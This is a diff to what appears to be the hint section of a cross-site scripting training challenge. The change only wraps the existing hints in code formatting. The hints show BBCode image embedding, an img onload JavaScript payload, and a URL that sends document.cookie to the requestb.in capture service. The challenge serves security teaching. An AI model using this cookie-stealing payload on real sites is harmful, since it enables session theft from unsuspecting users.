@@ -22,7 +22,7 @@ Stuck?
 ----------------------
 <details> 
   <summary>Click for hint 1</summary>
-   BBCode allows you to embed an image like so: [img]http://url.com/image.jpg[/img]
+   BBCode allows you to embed an image like so: ```[img]http://url.com/image.jpg[/img]```
    
    Play around with that.
 </details>
@@ -36,7 +36,7 @@ Stuck?
   <summary>Click for hint 3</summary>
    http://requestb.in/ is a neat site for testing webhooks. Cookie stealing is kind of like a webhook. If you were somehow able to get javascript execution, you could potentially change the SRC of the image to something like this:
    
-   http://requestb.in/1fj9x6o1?c='+document.cookie
+   ```http://requestb.in/1fj9x6o1?c='+document.cookie```
    
    And then review the cookie (passed as a GET parameter) on requestb.in!
 </details>
@@ -45,7 +45,7 @@ Stuck?
   <summary>Click for hint 4</summary>
    Did you know you can execute javascript when an image loads? It's simple! All you have to do is use the onLoad attribute, like so:
    
-   &lt;img src="logo.png" onload="alert(1)"&gt;
+   ```&lt;img src="logo.png" onload="alert(1)"&gt;```
 </details>
 
 <details> 
